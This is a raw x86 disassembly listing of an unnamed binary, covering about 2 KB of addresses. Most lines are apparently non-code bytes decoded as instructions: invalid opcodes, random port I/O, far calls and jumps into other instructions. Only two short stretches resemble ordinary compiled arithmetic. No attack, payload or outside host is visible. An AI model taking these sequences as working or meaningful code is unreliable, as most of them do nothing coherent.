  413982:	mov    BYTE PTR [edi-0x7c],bh
  413985:	mov    ecx,0x3008cd7b
  41398a:	add    eax,DWORD PTR [esi+0x40acdeb6]
  413990:	pop    ebx
  413991:	das    
  413992:	and    eax,0x74f254fa
  413997:	fidiv  WORD PTR [ebx]
  413999:	mov    esp,0xb7cd3206
  41399e:	mov    dh,0xab
  4139a0:	xlat   BYTE PTR ds:[ebx]
  4139a1:	add    eax,0xb7158383
  4139a6:	push   cs
  4139a7:	ud0    esi,DWORD PTR [edi]
  4139aa:	cli    
  4139ab:	outs   dx,BYTE PTR ds:[esi]
  4139ac:	sub    al,0x71
  4139ae:	mov    al,BYTE PTR [ecx-0x655021ca]
  4139b4:	pop    ebx
  4139b5:	(bad)  
  4139b6:	aad    0x43
  4139b8:	inc    ebp
  4139b9:	jb     0x4139da
  4139bb:	add    BYTE PTR [edi],bh
  4139bd:	psubusw mm7,QWORD PTR [edi+0x7a427b2d]
  4139c4:	jmp    0x413a03
  4139c6:	cmp    dh,ah
  4139c8:	mov    edx,0x3bdb31a2
  4139cd:	or     dl,al
  4139cf:	loopne 0x41398e
  4139d1:	and    edi,edi
  4139d3:	fst    QWORD PTR [ebx+ecx*4-0x79190a9b]
  4139da:	enter  0x41ae,0x10
  4139de:	call   0xe4fb2b54
  4139e3:	iret   
  4139e4:	out    0xe6,al
  4139e6:	mov    bl,BYTE PTR [edi+0x2c]
  4139e9:	sub    al,0x78
  4139eb:	ds and dh,0xf6
  4139ef:	mov    eax,0xea7cb92c
  4139f4:	adc    al,0xa4
  4139f6:	test   eax,eax
  4139f8:	mov    al,0xaf
  4139fa:	xlat   BYTE PTR ds:[ebx]
  4139fb:	push   edx
  4139fc:	pop    ds
  4139fd:	call   DWORD PTR [ebx-0x50215aea]
  413a03:	lds    edi,FWORD PTR [ebp-0x133fe8a4]
  413a09:	pop    edi
  413a0a:	push   eax
  413a0b:	das    
  413a0c:	sbb    edi,DWORD PTR [ebp+0x36]
  413a0f:	fstp   QWORD PTR [ecx]
  413a11:	pop    ebp
  413a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a13:	leave  
  413a14:	or     DWORD PTR [edi-0x75119153],ebp
  413a1a:	jl     0x413a75
  413a1c:	out    dx,al
  413a1d:	shl    DWORD PTR [edx],cl
  413a1f:	mov    edx,0x95836bea
  413a24:	inc    ebx
  413a25:	mov    eax,0x4c4ed2e9
  413a2a:	mov    ?,WORD PTR [ebx+edi*1-0x19]
  413a2e:	sbb    DWORD PTR ds:0xda2d6aa0,ecx
  413a34:	push   edi
  413a35:	into   
  413a36:	in     eax,dx
  413a37:	xchg   ebx,eax
  413a38:	jle    0x413a03
  413a3a:	mul    BYTE PTR [edi-0x6d72be02]
  413a40:	pop    esp
  413a41:	sbb    ch,BYTE PTR [ebx]
  413a43:	shr    DWORD PTR [ebp-0x5],1
  413a46:	call   0xdff6:0xfa2928ed
  413a4d:	jecxz  0x4139cf
  413a4f:	adc    BYTE PTR [ebx],dh
  413a51:	sar    bh,cl
  413a53:	(bad)  
  413a54:	mov    BYTE PTR [edx],ah
  413a56:	mov    al,ds:0x8062b37
  413a5b:	or     ebx,DWORD PTR [esi+0x1b716c20]
  413a61:	(bad)  
  413a63:	mov    cl,0x2c
  413a65:	repnz jmp FWORD PTR [ecx+esi*2]
  413a69:	jecxz  0x413a77
  413a6b:	adc    BYTE PTR [ecx-0x2e928624],bl
  413a71:	push   0xb826fc03
  413a76:	jle    0x413a0c
  413a78:	hlt    
  413a79:	mov    dh,0xdb
  413a7b:	mov    edx,DWORD PTR [ecx]
  413a7d:	inc    esi
  413a7e:	out    dx,eax
  413a7f:	push   ds
  413a80:	stc    
  413a81:	sub    BYTE PTR cs:[eax+0x3e],dl
  413a85:	mov    DWORD PTR [ebx-0x35],eax
  413a88:	adc    DWORD PTR [ebx-0x27f5405b],ecx
  413a8e:	rcl    esi,0x91
  413a91:	and    ecx,0xffffffcf
  413a94:	and    eax,ebp
  413a96:	out    0x93,eax
  413a98:	in     eax,0x2f
  413a9a:	xchg   esp,eax
  413a9b:	jnp    0x413aab
  413a9d:	add    eax,0x47eec484
  413aa2:	shl    DWORD PTR [edx-0x293cbbe5],cl
  413aa8:	xchg   dh,dl
  413aaa:	adc    DWORD PTR [ebx+0x63],0xf1ab373d
  413ab1:	cs test eax,0x967d74fc
  413ab7:	imul   edx,DWORD PTR [edx+edi*1-0x13],0xffffffcf
  413abc:	mov    ds:0x96c58cb7,al
  413ac1:	stc    
  413ac2:	pop    edx
  413ac3:	lahf   
  413ac4:	sti    
  413ac5:	aad    0x9
  413ac7:	dec    esi
  413ac8:	xchg   esi,eax
  413ac9:	nop
  413aca:	dec    esi
  413acb:	cmp    BYTE PTR [esi],ah
  413acd:	pusha  
  413ace:	xlat   BYTE PTR ds:[ebx]
  413acf:	ds popa 
  413ad1:	mov    ecx,0xf72f06e6
  413ad6:	test   eax,0x2c3fb3a2
  413adb:	fwait
  413adc:	inc    ebx
  413add:	test   eax,0x96424426
  413ae2:	or     BYTE PTR fs:[edx],dl
  413ae5:	xchg   ebp,eax
  413ae6:	push   es
  413ae7:	lahf   
  413ae8:	push   edx
  413ae9:	and    bl,ch
  413aeb:	jmp    0x413b32
  413aed:	loop   0x413b2b
  413aef:	dec    esi
  413af0:	jnp    0x413ad5
  413af2:	cs rdtsc 
  413af5:	ret    
  413af6:	(bad)  
  413af7:	cmp    DWORD PTR [edx],edx
  413af9:	jno    0x413af9
  413afb:	jmp    0x77a8:0xf2f82fe8
  413b02:	mov    WORD PTR [ecx+0x74],?
  413b05:	in     al,dx
  413b06:	pop    ds
  413b07:	pop    edx
  413b08:	jne    0x413b2d
  413b0a:	sub    esi,0x60
  413b0d:	es push ebp
  413b0f:	repz jne 0x413aa1
  413b12:	daa    
  413b13:	mov    esp,0x5be3924
  413b18:	mov    ds:0x943ee563,al
  413b1d:	mov    ecx,0x13b7633b
  413b22:	bswap  esi
  413b24:	std    
  413b25:	cmp    eax,0x15abd25e
  413b2a:	adc    ch,BYTE PTR [ecx]
  413b2c:	in     al,dx
  413b2d:	icebp  
  413b2e:	(bad)  
  413b30:	push   ds
  413b31:	cli    
  413b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b33:	cmp    al,0x2
  413b35:	xchg   edi,eax
  413b36:	xor    ecx,esp
  413b38:	add    eax,0xefba051c
  413b3d:	mov    ds:0xfd211468,eax
  413b42:	jmp    0x413ae7
  413b44:	test   DWORD PTR [edx-0x1],ebx
  413b47:	sbb    ah,al
  413b49:	cmp    esp,DWORD PTR [ecx]
  413b4b:	dec    ebp
  413b4c:	test   DWORD PTR [edi-0x50],edx
  413b4f:	dec    ebx
  413b50:	cmp    DWORD PTR [edx],edx
  413b52:	and    al,0xec
  413b54:	or     esp,0x90ea534f
  413b5a:	stos   DWORD PTR es:[edi],eax
  413b5b:	cmp    al,0x2d
  413b5d:	dec    ebx
  413b5e:	call   0x691c:0x8e091070
  413b65:	push   edi
  413b66:	shl    DWORD PTR [ecx+0x41c6aa02],1
  413b6c:	loopne 0x413b2a
  413b6e:	push   edx
  413b6f:	or     al,0x55
  413b71:	sbb    edi,DWORD PTR [esi+0x62]
  413b74:	mov    ebx,0xb39e64bb
  413b79:	mov    ?,WORD PTR [edi-0x59]
  413b7c:	ins    BYTE PTR es:[edi],dx
  413b7d:	shr    DWORD PTR [ebx],0x5b
  413b80:	add    edx,edx
  413b82:	out    dx,al
  413b83:	add    bh,BYTE PTR [eax]
  413b85:	xor    edx,ebp
  413b87:	(bad)  
  413b88:	data16 test al,0x4e
  413b8b:	mov    edi,edx
  413b8d:	scas   eax,DWORD PTR es:[edi]
  413b8e:	add    DWORD PTR [edi-0x40],0x1fc503fc
  413b95:	adc    ecx,edi
  413b97:	inc    eax
  413b98:	clc    
  413b99:	lods   eax,DWORD PTR ds:[esi]
  413b9a:	out    0xfa,al
  413b9c:	mov    WORD PTR [esi+0xcc72d9e],?
  413ba2:	stos   BYTE PTR es:[edi],al
  413ba3:	sub    dh,al
  413ba5:	test   BYTE PTR [esi],0x8d
  413ba8:	stos   DWORD PTR es:[edi],eax
  413ba9:	adc    BYTE PTR [ebp+0xa962f74],ah
  413baf:	je     0x413b8b
  413bb1:	push   es
  413bb2:	or     dh,cl
  413bb4:	scas   al,BYTE PTR es:[edi]
  413bb5:	push   ds
  413bb6:	jl     0x413b60
  413bb8:	ins    BYTE PTR es:[edi],dx
  413bb9:	arpl   WORD PTR [eax*1+0x2cee0587],dx
  413bc0:	xchg   DWORD PTR [eax-0x12],edx
  413bc3:	sub    BYTE PTR [edx+0x4b],bh
  413bc6:	mov    esp,ecx
  413bc8:	push   edi
  413bc9:	cmp    cl,BYTE PTR ds:0x15d0a421
  413bcf:	jl     0x413bad
  413bd1:	mov    al,0x93
  413bd3:	aad    0xec
  413bd5:	xlat   BYTE PTR ds:[ebx]
  413bd6:	mov    esi,0x93a8e9a
  413bdb:	stos   BYTE PTR es:[edi],al
  413bdc:	mov    bh,0xe5
  413bde:	xchg   esp,eax
  413bdf:	pop    ss
  413be0:	fstp   st(6)
  413be2:	jne    0x413c0d
  413be4:	xor    bl,ah
  413be6:	mov    esi,0xcf14c572
  413beb:	dec    edi
  413bec:	outs   dx,DWORD PTR ds:[esi]
  413bed:	inc    esp
  413bee:	jae    0x413c5a
  413bf0:	add    ebx,DWORD PTR [ebp+ebx*2-0x2f071dd4]
  413bf7:	fistp  DWORD PTR [ebx+0x1d60ddcd]
  413bfd:	(bad)  
  413bfe:	int3   
  413bff:	ins    BYTE PTR es:[edi],dx
  413c00:	mov    eax,0x73fde33e
  413c05:	in     eax,0xb3
  413c07:	adc    al,0xf9
  413c09:	mov    esi,0x76841682
  413c0e:	add    eax,0xd0620a2e
  413c13:	and    esp,esp
  413c15:	popa   
  413c16:	fadd   st,st(7)
  413c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c19:	mov    esp,0x9d647fe0
  413c1e:	(bad)  
  413c1f:	push   ebp
  413c20:	fcom   DWORD PTR [esi-0x55]
  413c23:	ds scas al,BYTE PTR es:[edi]
  413c25:	sar    al,0x2e
  413c28:	mov    dh,0x9d
  413c2a:	push   esi
  413c2b:	cwde   
  413c2c:	xchg   edx,eax
  413c2d:	inc    esi
  413c2e:	pop    eax
  413c2f:	retf   
  413c30:	xchg   ebx,eax
  413c31:	in     eax,dx
  413c32:	fsubp  st(3),st
  413c34:	cmp    ecx,DWORD PTR [esi+eax*8+0x26]
  413c38:	push   edx
  413c39:	mov    bh,0xe8
  413c3b:	push   edx
  413c3c:	bound  ebp,QWORD PTR [eax-0x66]
  413c3f:	aad    0xfc
  413c41:	pop    edx
  413c42:	adc    al,0x79
  413c44:	aaa    
  413c45:	dec    ecx
  413c46:	xor    esp,edx
  413c48:	fsub   st,st(5)
  413c4a:	xchg   esp,eax
  413c4b:	aad    0x61
  413c4d:	fs xchg ebx,eax
  413c4f:	lods   eax,DWORD PTR ds:[esi]
  413c50:	das    
  413c51:	shl    BYTE PTR cs:[esi+0x33ace05],cl
  413c58:	stos   DWORD PTR es:[edi],eax
  413c59:	adc    al,0xae
  413c5b:	mov    ?,WORD PTR [bx+si]
  413c5e:	out    dx,al
  413c5f:	fidiv  WORD PTR [esi]
  413c61:	out    0xcc,al
  413c63:	arpl   WORD PTR [ebp-0x11],ax
  413c66:	mov    eax,ebp
  413c68:	adc    DWORD PTR gs:[ecx-0x15ec5c9e],ebx
  413c6f:	dec    edx
  413c70:	arpl   WORD PTR [esi+esi*1+0x6ac4a87f],si
  413c77:	hlt    
  413c78:	xor    eax,0x38089c14
  413c7d:	sbb    al,0x4
  413c7f:	mov    eax,0x1344f1b4
  413c84:	sub    eax,0xd37348ab
  413c89:	or     esi,0xffffffde
  413c8c:	mov    DWORD PTR [ecx-0x17],esi
  413c8f:	aaa    
  413c90:	jbe    0x413c14
  413c92:	xor    al,al
  413c94:	xor    al,0x7f
  413c96:	pusha  
  413c97:	sbb    eax,0xe01a0b7f
  413c9c:	mov    esi,0x7bad3e92
  413ca1:	(bad)  
  413ca2:	std    
  413ca3:	dec    dl
  413ca5:	mov    cl,0x89
  413ca7:	pop    esi
  413ca8:	outs   dx,DWORD PTR ds:[si]
  413caa:	inc    edx
  413cab:	add    edx,DWORD PTR [eax]
  413cad:	mov    ecx,DWORD PTR [ebp-0x28]
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	ja     0x413d53
  413d00:	sar    DWORD PTR [ecx+ecx*4-0x55e7e7ce],cl
  413d07:	adc    bl,BYTE PTR [eax]
  413d09:	sbb    BYTE PTR [eax-0xe],cl
  413d0c:	add    esp,ecx
  413d0e:	aam    0xc3
  413d10:	test   DWORD PTR [ecx+0x743aacae],eax
  413d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d17:	loope  0x413d07
  413d19:	xor    BYTE PTR [eax+0x63227e5a],bh
  413d1f:	jne    0x413d5c
  413d21:	out    0x78,eax
  413d23:	xchg   ebx,eax
  413d24:	js     0x413d5e
  413d26:	inc    edx
  413d27:	mov    eax,0x939cba96
  413d2c:	sub    al,0x90
  413d2e:	shl    BYTE PTR [edi-0x6b],1
  413d31:	or     ch,BYTE PTR [ebx-0x276d1a36]
  413d37:	lods   al,BYTE PTR ds:[esi]
  413d38:	jb     0x413d02
  413d3a:	jb     0x413cef
  413d3c:	repz cli 
  413d3e:	cmp    DWORD PTR [ebp+0x77c20d81],0xffffffa8
  413d45:	neg    BYTE PTR ds:0xa233d9cb
  413d4b:	mov    ch,0x28
  413d4d:	iret   
  413d4e:	(bad)  
  413d4f:	gs pop ebp
  413d51:	mov    al,ds:0x5bdf7692
  413d56:	and    ecx,DWORD PTR [edx+ecx*1]
  413d59:	fiadd  DWORD PTR [esi-0x58]
  413d5c:	push   ds
  413d5d:	mov    dl,0xf9
  413d5f:	sub    bl,BYTE PTR [edi+0x63]
  413d62:	retf   0x55f6
  413d65:	loopne 0x413d75
  413d67:	ds sbb dl,al
  413d6a:	shl    ch,1
  413d6c:	fdiv   DWORD PTR [esi]
  413d6e:	(bad)  
  413d6f:	dec    ecx
  413d70:	push   esi
  413d71:	sub    bh,BYTE PTR [esi-0x232af811]
  413d77:	xchg   ecx,eax
  413d78:	cwde   
  413d79:	sub    ah,BYTE PTR [edi-0x6f]
  413d7c:	out    dx,al
  413d7d:	pop    ebp
  413d7e:	cmp    DWORD PTR [edi+0x11],ebp
  413d81:	out    0xb,eax
  413d83:	cmp    edi,DWORD PTR [edi]
  413d85:	pushf  
  413d86:	int    0xb1
  413d88:	dec    eax
  413d89:	mov    eax,DWORD PTR [eax]
  413d8b:	push   cs
  413d8c:	add    ebx,DWORD PTR [ebx]
  413d8e:	jmp    0xd3d1518f
  413d93:	dec    ecx
  413d94:	sti    
  413d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d96:	enter  0x1c62,0x9b
  413d9a:	jmp    0x8ba8c9f4
  413d9f:	or     DWORD PTR [eax-0x67],edi
  413da2:	cmp    DWORD PTR [ecx],0xf42e6ba4
  413da8:	xor    esp,esp
  413daa:	adc    ch,BYTE PTR ds:0xc945c130
  413db0:	cmc    
  413db1:	cwde   
  413db2:	dec    edx
  413db3:	xchg   esi,eax
  413db4:	out    dx,al
  413db5:	pop    edx
  413db6:	loop   0x413d69
  413db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db9:	test   bh,bl
  413dbb:	cmp    eax,0xd560961a
  413dc0:	fnstenv [edi-0x3f237fc3]
  413dc6:	cmp    al,0xfd
  413dc8:	mov    dh,0x53
  413dca:	mov    esi,eax
  413dcc:	stos   DWORD PTR es:[edi],eax
  413dcd:	dec    edx
  413dce:	add    dl,BYTE PTR [esi+0x40]
  413dd1:	jne    0x413e3e
  413dd3:	push   cs
  413dd4:	bound  ebx,QWORD PTR [eax+0x62]
  413dd7:	xor    ch,BYTE PTR [edx+edi*2]
  413dda:	jnp    0x413e3f
  413ddc:	stos   DWORD PTR es:[edi],eax
  413ddd:	in     eax,0x33
  413ddf:	(bad)  
  413de0:	dec    edx
  413de1:	push   ebx
  413de2:	pop    esp
  413de3:	ja     0x413d8c
  413de5:	jno    0x413e4a
  413de7:	popa   
  413de8:	nop
  413de9:	cmc    
  413dea:	push   ebx
  413deb:	fbstp  TBYTE PTR [edi+eax*8-0x55]
  413def:	push   ebp
  413df0:	add    eax,0x1c5a60d3
  413df5:	cmp    eax,0xf17e81a9
  413dfa:	mov    cl,0xf8
  413dfc:	mov    ecx,0x3d344b31
  413e01:	xor    eax,0xa65cf30f
  413e06:	sub    eax,0xd6cbb8b3
  413e0b:	mov    edx,0x51fe59f
  413e10:	frstor [ecx]
  413e12:	push   ebx
  413e13:	pop    edx
  413e14:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e16:	ja     0x413dbc
  413e18:	ret    0x2fb7
  413e1b:	aam    0x44
  413e1d:	inc    edx
  413e1e:	xlat   BYTE PTR ds:[ebx]
  413e1f:	mov    ah,0x8d
  413e21:	xchg   esp,eax
  413e22:	mov    dl,BYTE PTR [esi-0x77e279f]
  413e28:	dec    esp
  413e29:	mov    esp,0x78a6861e
  413e2e:	fstp   st(6)
  413e30:	mov    al,0xb7
  413e32:	js     0x413e34
  413e34:	sbb    ch,BYTE PTR cs:[ebp-0xd]
  413e38:	jmp    0x413e6a
  413e3a:	repnz or al,0xb3
  413e3d:	loop   0x413e2b
  413e3f:	push   cs
  413e40:	ja     0x413e3a
  413e42:	lods   al,BYTE PTR ds:[esi]
  413e43:	aaa    
  413e44:	xchg   esp,eax
  413e45:	test   eax,0xf76b47f1
  413e4a:	jae    0x413e9d
  413e4c:	inc    eax
  413e4d:	add    edx,DWORD PTR [ecx+0x66]
  413e50:	inc    ecx
  413e51:	adc    bl,BYTE PTR [edx+eax*8+0x73]
  413e55:	inc    edx
  413e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e57:	fidiv  WORD PTR [ebx]
  413e59:	mov    bl,0x8f
  413e5b:	(bad)  
  413e5c:	or     eax,0x148a817f
  413e61:	popa   
  413e62:	jno    0x413e92
  413e64:	popa   
  413e65:	mov    ebx,0x52e2b9a4
  413e6a:	sub    ch,al
  413e6c:	mov    esp,0x4b1360f8
  413e71:	pop    es
  413e72:	push   cs
  413e73:	mov    cl,0xac
  413e75:	nop
  413e76:	jns    0x413e35
  413e78:	and    dh,al
  413e7a:	xchg   esp,edx
  413e7c:	lock xlat BYTE PTR ds:[ebx]
  413e7e:	pop    eax
  413e7f:	jge    0x413e4d
  413e81:	jnp    0x413e43
  413e83:	rcr    BYTE PTR [edi-0x328287bc],cl
  413e89:	jge    0x413ea5
  413e8b:	test   ch,dl
  413e8d:	das    
  413e8e:	test   BYTE PTR [edi-0x3fd7da4d],ah
  413e94:	and    DWORD PTR [eax],ebp
  413e96:	mov    eax,0xc552c58a
  413e9b:	cdq    
  413e9c:	push   edx
  413e9d:	cmp    DWORD PTR [ecx-0x6c008264],ebp
  413ea3:	arpl   WORD PTR [edi+0x3b1fee91],sp
  413ea9:	pop    eax
  413eaa:	jb     0x413e6d
  413eac:	(bad)  
  413ead:	cmp    eax,0xeb43ddc6
  413eb2:	jle    0x413eb1
  413eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb5:	mov    cl,0x37
  413eb7:	ins    BYTE PTR es:[edi],dx
  413eb8:	mov    dl,0xc
  413eba:	sub    BYTE PTR [ecx-0x8730ef5],bl
  413ec0:	mov    esp,0x66b39910
  413ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec6:	mov    bh,0x95
  413ec8:	call   0xd65b8662
  413ecd:	pop    ecx
  413ece:	sub    al,0x24
  413ed0:	jg     0x413ece
  413ed2:	(bad)  
  413ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed4:	dec    ecx
  413ed5:	sub    dl,dh
  413ed7:	pop    esi
  413ed8:	inc    ebp
  413ed9:	minps  xmm3,XMMWORD PTR [edi+eax*2-0x539a1fdf]
  413ee1:	pop    esi
  413ee2:	mov    BYTE PTR [edx],ch
  413ee4:	xchg   edi,eax
  413ee5:	jmp    0x21f46f27
  413eea:	les    eax,FWORD PTR [edx-0x3]
  413eed:	cwde   
  413eee:	adc    al,0xad
  413ef0:	sti    
  413ef1:	dec    eax
  413ef2:	nop
  413ef3:	push   esi
  413ef4:	(bad)  
  413ef5:	clc    
  413ef6:	mov    ebx,0xd04161a9
  413efb:	inc    eax
  413efc:	fstp   QWORD PTR [ecx-0x27]
  413eff:	sti    
  413f00:	pop    ebx
  413f01:	pop    edi
  413f02:	push   esi
  413f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f04:	in     eax,dx
  413f05:	adc    DWORD PTR [ecx-0x282ece9],esp
  413f0b:	add    ecx,DWORD PTR es:[edi+eax*8]
  413f0f:	aaa    
  413f10:	pusha  
  413f11:	or     al,0xb6
  413f13:	or     DWORD PTR [edi+0x416d0589],esi
  413f19:	aaa    
  413f1a:	sub    bl,BYTE PTR [ebx]
  413f1c:	inc    ebx
  413f1d:	xor    DWORD PTR [edi+0x5ce9644b],ecx
  413f23:	bound  edx,QWORD PTR [esi-0x4e6bb827]
  413f29:	rcl    BYTE PTR [edi+0x5a49ea44],cl
  413f2f:	mov    BYTE PTR [esi+0x4a],al
  413f32:	hlt    
  413f33:	out    dx,al
  413f34:	xchg   edi,eax
  413f35:	mov    fs,ebp
  413f37:	iret   
  413f38:	rcl    esp,1
  413f3a:	push   es
  413f3b:	mov    cl,0x6c
  413f3d:	mov    bh,0x9c
  413f3f:	jmp    0x94ce9e4a
  413f44:	fisubr DWORD PTR [ebx]
  413f46:	fyl2xp1 
  413f48:	xchg   ecx,eax
  413f49:	jp     0x413f73
  413f4b:	xor    dl,BYTE PTR [ecx+esi*4+0x17b36019]
  413f52:	xchg   edx,eax
  413f53:	inc    esi
  413f54:	sahf   
  413f55:	mov    bl,0x22
  413f57:	in     al,dx
  413f58:	loopne 0x413fbc
  413f5a:	out    0x82,al
  413f5c:	lock xchg ebx,eax
  413f5e:	inc    eax
  413f5f:	out    dx,al
  413f60:	popf   
  413f61:	ret    0x9dd1
  413f64:	mov    ebp,0x244ae654
  413f69:	jmp    0x413fac
  413f6b:	fwait
  413f6c:	call   0x7ba0:0x50206b9f
  413f73:	adc    BYTE PTR [esi-0x31c37e49],ah
  413f79:	adc    eax,ebx
  413f7b:	test   DWORD PTR ds:0x14cb6846,ebx
  413f81:	gs (bad) 
  413f84:	neg    DWORD PTR [ecx+eax*4+0x51fd2ed8]
  413f8b:	dec    eax
  413f8c:	mov    ds:0x40a2dc2a,eax
  413f91:	clc    
  413f92:	data16 fld DWORD PTR [ebp-0x63]
  413f96:	push   ss
  413f97:	jl     0x413f87
  413f99:	sbb    eax,0xc1de12db
  413f9e:	dec    esi
  413f9f:	push   ebx
  413fa0:	or     al,0xec
  413fa2:	(bad)  
  413fa3:	fld    TBYTE PTR [esi+0x7506a4dd]
  413fa9:	ss pop eax
  413fab:	mov    DWORD PTR [esi],edi
  413fad:	fnstcw WORD PTR [edx]
  413faf:	fdivr  QWORD PTR [edx]
  413fb1:	(bad)  
  413fb2:	mov    al,0xfb
  413fb4:	mov    al,ds:0x4dbbb973
  413fb9:	in     eax,0x95
  413fbb:	imul   BYTE PTR [ebp-0x5b3b6780]
  413fc1:	dec    edi
  413fc2:	iret   
  413fc3:	div    BYTE PTR [ebp-0x1b]
  413fc6:	xchg   DWORD PTR [eax],ecx
  413fc8:	ins    BYTE PTR es:[edi],dx
  413fc9:	xchg   DWORD PTR [ecx],esi
  413fcb:	clc    
  413fcc:	and    esp,DWORD PTR [ecx+0x7d3a94d4]
  413fd2:	xchg   DWORD PTR [eax-0x6e],edx
  413fd5:	adc    al,0xf3
  413fd7:	push   0xffffffdd
  413fd9:	push   ecx
  413fda:	dec    ebx
  413fdb:	inc    edx
  413fdc:	xlat   BYTE PTR ds:[ebx]
  413fdd:	pop    ss
  413fde:	push   edi
  413fdf:	je     0x414011
  413fe1:	pop    edx
  413fe2:	mov    WORD PTR ds:0x67f01cc1,gs
  413fe8:	mov    ds:0x2aba9ada,al
  413fed:	add    ebx,ebp
  413fef:	xor    BYTE PTR [ebx-0x3d4f5ce],0x38
  413ff6:	stos   BYTE PTR es:[edi],al
  413ff7:	xchg   ebp,eax
  413ff8:	mov    edx,0x49ba6296
  413ffd:	stos   BYTE PTR es:[edi],al
  413ffe:	adc    DWORD PTR [edx+ebp*8-0x11],0x35cacb5c
  414006:	add    al,0xc
  414008:	add    al,0x6a
  41400a:	rol    cl,0xe5
  41400d:	fisttp QWORD PTR [edi]
  41400f:	sbb    al,0xff
  414011:	jecxz  0x413fc1
  414013:	dec    edi
  414015:	xchg   ax,ax
  414017:	(bad)  
  414018:	cmp    BYTE PTR [edi+0x5e],dh
  41401b:	pushf  
  41401c:	out    dx,al
  41401d:	loope  0x414017
  41401f:	cmp    al,0x24
  414021:	fild   WORD PTR ds:0x8fc37fcc
  414027:	sub    DWORD PTR [eax+eax*8-0x68],0x1e
  41402c:	retf   
  41402d:	hlt    
  41402e:	daa    
  41402f:	rcl    bl,0x4b
  414032:	xor    eax,0x3b4b43a1
  414037:	lea    edx,[ebx]
  414039:	pusha  
  41403a:	push   esi
  41403b:	in     eax,dx
  41403c:	pop    eax
  41403d:	push   ds
  41403e:	in     al,0x4d
  414040:	xor    DWORD PTR [esi+edi*4],esp
  414043:	mov    bh,0x23
  414045:	inc    ebp
  414046:	inc    ebx
  414047:	dec    ecx
  414048:	xlat   BYTE PTR ds:[ebx]
  414049:	sub    eax,0x6102f5a2
  41404e:	enter  0x2f6,0x64
  414052:	lods   al,BYTE PTR ds:[esi]
  414053:	jno    0x414051
  414055:	fcom   DWORD PTR [edi+0x59]
  414058:	and    bl,BYTE PTR [ebp+ecx*8-0x50f7bd9a]
  41405f:	pusha  
  414060:	hlt    
  414061:	mov    edx,0x23efa68b
  414066:	push   es
  414067:	inc    edi
  414068:	push   cs
  414069:	mov    ah,0x62
  41406b:	add    esp,edi
  41406d:	xor    BYTE PTR [edi],dh
  41406f:	jg     0x4140cb
  414071:	or     al,0xee
  414073:	ret    0x3391
  414076:	sub    eax,0x2ceea20e
  41407b:	jno    0x4140b5
  41407d:	test   al,0x32
  41407f:	in     al,0x71
  414081:	aas    
  414082:	push   ds
  414083:	mov    esp,0x24f8ea03
  414088:	js     0x41406d
  41408a:	mov    BYTE PTR [eax],ah
  41408c:	stc    
  41408d:	mov    ss,ebp
  41408f:	mov    ds:0x2b6ae9bb,al
  414094:	cmp    al,0x1c
  414096:	dec    ebp
  414097:	aam    0x5d
  414099:	mov    eax,ds:0xbdf7896c
  41409e:	cmp    DWORD PTR [ebx+0x17],ebx
  4140a1:	idiv   BYTE PTR [edi+0x30332cbf]
  4140a7:	scas   al,BYTE PTR es:[edi]
  4140a8:	cwde   
  4140a9:	(bad)  
  4140aa:	popf   
  4140ab:	cmp    DWORD PTR [ebp-0x3],esi
  4140ae:	xor    edx,DWORD PTR [edx]
  4140b0:	pop    edi
  4140b1:	fcomip st,st(1)
  4140b3:	or     al,0x1
  4140b5:	xchg   edx,eax
  4140b6:	js     0x414055
  4140b8:	fstp   QWORD PTR [esi]
  4140ba:	pop    ebp
  4140bb:	(bad)  
  4140bc:	stc    
  4140bd:	dec    BYTE PTR [eax-0x2fd42b73]
  4140c3:	sbb    BYTE PTR ds:0xc4758957,0x8b
  4140ca:	inc    ebp
  4140cb:	mov    eax,0x68bc4d8b
  4140d0:	rol    DWORD PTR [esp+eax*1],cl
  4140d3:	scas   al,BYTE PTR es:[edi]
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x422072
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
